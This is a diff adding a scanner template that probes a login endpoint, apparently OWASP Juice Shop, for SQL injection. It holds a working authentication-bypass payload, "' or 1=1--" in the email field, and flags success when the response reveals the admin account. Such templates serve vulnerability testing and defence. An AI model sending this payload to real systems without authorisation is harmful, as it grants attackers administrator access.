@@ -1,0 +1,26 @@
+id: sql-injection-login
+
+info:
+  name: SQL Injection in Login Endpoint
+  author: ProjectDiscoveryAI
+  severity: critical
+  description: |
+    SQL Injection vulnerability in the login endpoint allows authentication as an administrator by improperly handling user input in the email field.
+
+http:
+  - raw:
+      - |
+        POST /rest/user/login HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0
+        Content-Type: application/json
+
+        {"email":"' or 1=1--","password":"123"}
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - '"umail":"admin@juice-sh.op"'
